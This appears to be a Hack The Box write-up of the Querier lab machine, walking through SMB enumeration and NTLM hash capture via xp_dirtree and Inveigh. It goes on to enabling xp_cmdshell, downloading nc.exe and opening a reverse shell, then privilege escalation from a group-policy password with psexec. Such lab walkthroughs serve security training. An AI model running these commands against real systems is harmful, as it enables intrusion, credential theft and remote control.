@@ -1,0 +1,111 @@
+<hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys this is the second post for Querier, you can read the first post <a href="/hack-the-box/querier">here</a>. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is <code class="highlighter-rouge">10.10.10.125</code> I added it to <code class="highlighter-rouge">C:\Windows\System32\drivers\etc\hosts</code> as <code class="highlighter-rouge">querier.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/querier-2/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC querier.htb</code>
+<img src="/images/hackthebox/querier-2/1.png" alt="" />
+<br /> We got <code class="highlighter-rouge">smb</code> and <code class="highlighter-rouge">mssql</code> server on port 1433. We don’t have credentials for <code class="highlighter-rouge">mssql</code> so let’s check <code class="highlighter-rouge">smb</code>.
+<br /></p>
+<hr />
+
+<h2 id="smb">Smb</h2>
+<p><br /> We need to list the shares, We can do that using <code class="highlighter-rouge">net view</code> :
+<code class="highlighter-rouge">net view querier.htb</code>
+<img src="/images/hackthebox/querier-2/2.png" alt="" />
+<br /> It only showed us <code class="highlighter-rouge">Reports</code> because it’s the only share that we can access anonymously which is nice. 
+<br /> We can mount the share from <code class="highlighter-rouge">cmd</code> with <code class="highlighter-rouge">net use</code> :
+<code class="highlighter-rouge">net use Z: \\querier.htb\Reports /persistent:yes</code>
+<img src="/images/hackthebox/querier-2/3.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/querier-2/4.png" alt="" />
+<br /> We can also do it from the file explorer :
+<img src="/images/hackthebox/querier-2/5.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/querier-2/6.png" alt="" /></p>
+<hr />
+
+<h2 id="mssql">MSSQL</h2>
+<p><br /> I used <code class="highlighter-rouge">olevba</code> to get credentials from the excel file like I did in the <a href="/hack-the-box/querier/">first post</a> :
+<img src="/images/hackthebox/querier-2/7.png" alt="" />
+<br /> To connect to the <code class="highlighter-rouge">mssql</code> server I will use <a href="https://www.heidisql.com/">HeidiSQL</a> :
+<img src="/images/hackthebox/querier-2/8.png" alt="" />
+<br /> However, authentication failed :
+<img src="/images/hackthebox/querier-2/9.png" alt="" />
+<br /> I tried windows authentication :
+<img src="/images/hackthebox/querier-2/10.png" alt="" />
+<br /> But it also failed because it was trying as guest not reporting :
+<img src="/images/hackthebox/querier-2/11.png" alt="" />
+<br /> To solve this we can use <code class="highlighter-rouge">runas</code> to run <code class="highlighter-rouge">heidi</code> as reporting :
+<code class="highlighter-rouge">runas /netonly /user:QUERIER\reporting cmd.exe</code>
+<img src="/images/hackthebox/querier-2/12.png" alt="" />
+<br /> From the new <code class="highlighter-rouge">cmd</code> session I ran <code class="highlighter-rouge">heidi</code> :
+<img src="/images/hackthebox/querier-2/13.png" alt="" />
+<br /> Now windows authentication worked :
+<img src="/images/hackthebox/querier-2/14.png" alt="" />
+<br /> Got permission denied for <code class="highlighter-rouge">xp_cmdshell</code> :
+<img src="/images/hackthebox/querier-2/15.png" alt="" />
+<br /> We can run a fake <code class="highlighter-rouge">smb</code> server to capture credentials using a tool called <code class="highlighter-rouge">Inveigh</code> which works like responder. From <code class="highlighter-rouge">powershell</code> I imported <code class="highlighter-rouge">Inveigh</code> (<code class="highlighter-rouge">Import-Module C:\Tools\Inveigh\Inveigh.ps1</code>). Then I disabled the firewall (<code class="highlighter-rouge">netsh advfirewall set allprofiles state off</code>) and invoked <code class="highlighter-rouge">Inveigh</code> (<code class="highlighter-rouge">Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y</code>). 
+<br /> From <code class="highlighter-rouge">Heidi</code> I used <code class="highlighter-rouge">xp_dirtree</code> :
+<code class="highlighter-rouge">EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'</code>
+<img src="/images/hackthebox/querier-2/16.png" alt="" />
+<br /> <code class="highlighter-rouge">Inveigh</code> captured the <code class="highlighter-rouge">NTLMv2</code> hash for <code class="highlighter-rouge">mssql-svc</code> :
+<img src="/images/hackthebox/querier-2/17.png" alt="" />
+<br /> After cracking the hash on another box the password is <code class="highlighter-rouge">corporate568</code>. Now we can use <code class="highlighter-rouge">runas</code> to run <code class="highlighter-rouge">Heidi</code> as <code class="highlighter-rouge">mssql-svc</code> :
+<code class="highlighter-rouge">runas /netonly /user:QUERIER\mssql-svc "C:\Program Files\HeidiSQL\heidisql.exe"</code>
+<img src="/images/hackthebox/querier-2/18.png" alt="" />
+<br /> Queries to enable <code class="highlighter-rouge">xp_cmdshell</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+</code></pre></div></div>
+<p><img src="/images/hackthebox/querier-2/19.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/querier-2/20.png" alt="" />
+<br /> Great, we got <code class="highlighter-rouge">RCE</code>. I ran a python server to host <code class="highlighter-rouge">nc.exe</code> then I downloaded it on the box and got a reverse shell :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe';
+EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337'
+</code></pre></div></div>
+<p><img src="/images/hackthebox/querier-2/21.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/querier-2/22.png" alt="" />
+<br /> We owned user.
+<br /></p>
+<hr />
+
+<h2 id="gpp-privilege-escalation-root-flag">GPP, Privilege Escalation, Root Flag</h2>
+<p><br /> As I said in the <a href="/hack-the-box/querier/">first post</a>, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like <code class="highlighter-rouge">LinEnum.sh</code> for Linux one of them is <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"><code class="highlighter-rouge">powerup.ps1</code></a> and it checks for group policy passwords. Let’s check that one :
+<img src="/images/hackthebox/querier-2/23.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/querier-2/24.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/querier-2/25.png" alt="" />
+<br /> It also decrypts the password which is nice. Password : <code class="highlighter-rouge">MyUnclesAreMarioAndLuigi!!1!</code>
+<br /> Now we can use <code class="highlighter-rouge">psexec</code> to get a shell as Administrator. I used <code class="highlighter-rouge">runas</code> to start <code class="highlighter-rouge">cmd</code> as <code class="highlighter-rouge">QUERIER\Administrator</code> then I used <code class="highlighter-rouge">psexec</code> :
+<code class="highlighter-rouge">runas /netonly /user:QUERIER\Administrator cmd.exe</code>
+<br />
+<br />
+<code class="highlighter-rouge">psexec \\querier.htb cmd</code>
+<img src="/images/hackthebox/querier-2/26.png" alt="" />
+<br /> And we owned root !
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> First write-up : <a href="/hack-the-box/querier">Hack The Box - Querier</a>
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/flujab/">Hack The Box - Flujab</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/netmon/">Hack The Box - Netmon</a></p>
+<hr />
+
